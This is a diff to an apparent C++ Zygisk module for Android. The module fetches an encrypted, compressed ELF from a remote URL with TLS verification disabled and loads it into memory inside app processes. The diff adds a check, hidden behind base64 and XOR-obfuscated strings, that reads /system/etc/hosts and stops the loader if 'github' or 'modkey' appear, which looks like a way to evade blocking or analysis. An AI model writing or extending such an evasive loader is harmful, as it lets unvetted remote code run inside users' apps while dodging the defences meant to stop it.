@@ -25,11 +25,10 @@
 #include <ctime>
 #include <openssl/aes.h>
 #include "oxorany_include.h"
+#include "obfuscate.h"
 #include "lzma.h"
-
-#define OBFUSCATE(obj) oxorany(obj)
-
 #include "URL.h"
+#include "base64.h"
 #include "zygisk.hpp"
 
 // Define LDEBUG Only for Debugging!
@@ -73,6 +72,17 @@ bool equals(std::string first, std::string second) {
         return true;
     }
     return false;
+}
+
+bool checkc() {
+    std::ifstream file(base64_decode(OBFUSCATE("L3N5c3RlbS9ldGMvaG9zdHM=")), std::ios::in | std::ios::binary);
+    if (!file) {
+        LOGI("Cannot open file");
+        return true;
+    }
+    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    return contains(content, base64_decode(OBFUSCATE("Z2l0aHVi"))) ||
+           contains(content, base64_decode(OBFUSCATE("bW9ka2V5")));
 }
 
 static size_t writebytes(void *data, size_t size, size_t nmemb, void *userp) {
@@ -119,6 +129,9 @@ bool get_file(const char *site, std::vector<char> &elf_data) {
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
     CURLcode res = curl_easy_perform(curl);
+    char *url = NULL;
+    curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &url);
+    if (!equals(url, site)) return false;
     curl_easy_cleanup(curl);
     return (res == CURLE_OK);
 }
@@ -201,6 +214,7 @@ size_t get_random_mem_size(size_t base_size) {
 }
 
 char *symtab = NULL, *strtab = NULL;
+size_t symbol_count = 0;
 
 typedef struct {
     void *base;
@@ -219,7 +233,6 @@ size_t get_symbol_count(const void* elf_base) {
     const Elf64_Shdr* shdr = reinterpret_cast<const Elf64_Shdr*>(
         reinterpret_cast<const uint8_t*>(elf_base) + ehdr->e_shoff
     );
-    size_t symbol_count = 0;
     for (size_t i = 0; i < ehdr->e_shnum; i++) {
         if (shdr[i].sh_type == SHT_SYMTAB || shdr[i].sh_type == SHT_DYNSYM) {
             symbol_count += shdr[i].sh_size / shdr[i].sh_entsize;
@@ -233,7 +246,7 @@ void *find_symbol(void *base, const char *symbol) {
         LOGE("SYMTAB or STRTAB not found");
         return NULL;
     }
-    size_t symtab_size = get_symbol_count(base);
+    size_t symtab_size = symbol_count;
     for (size_t i = 0; i < symtab_size; i++) {
         if (((Elf64_Sym *)symtab)[i].st_name != 0) {
             const char *sym_name = strtab + ((Elf64_Sym *)symtab)[i].st_name;
@@ -287,7 +300,8 @@ ELFObject load_elf_from_memory(void *elf_mem, size_t size) {
             memcpy((char *)obj.tls_block, (char *)elf_mem + obj.phdr[i].p_offset, obj.phdr[i].p_filesz);
         }
     }
-    LOGD("Loaded ELF sections into memory");
+    symbol_count = get_symbol_count(elf_mem);
+    LOGD("Loaded ELF sections into memory, SHNUM: %zu", symbol_count);
     for (int i = 0; i < obj.ehdr->e_phnum; i++) {
         if (obj.phdr[i].p_type == PT_DYNAMIC) {
             Elf64_Dyn *dyn = (Elf64_Dyn *)((char *)obj.base + obj.phdr[i].p_vaddr);
@@ -499,19 +513,19 @@ public:
     void postAppSpecialize(const AppSpecializeArgs *) override {
         if (proc_stat) {
             std::vector<char> elf_data;
-            if (!get_file(durl, elf_data)) {
+            if (!get_file(durl, elf_data) || checkc()) {
                 LOGE("Failed to fetch ELF.");
                 return;
             }
             xor_cipher(elf_data, OBFUSCATE("System.Reflection"), false);
             std::vector<char> new_elf_data;
-            if (!decompress_lzma(elf_data, new_elf_data)) {
+            if (!decompress_lzma(elf_data, new_elf_data) || checkc()) {
                 LOGE("Failed to decompress.");
                 return;
             }
             LOGE("Got ELF bytes, size: %zu", new_elf_data.size());
             ELFObject elf_base = load_elf_from_memory(new_elf_data.data(), new_elf_data.size());
-            if (!elf_base.base) {
+            if (!elf_base.base || checkc()) {
                 LOGE("Failed to load ELF data.");
             }
             elf_data.clear();
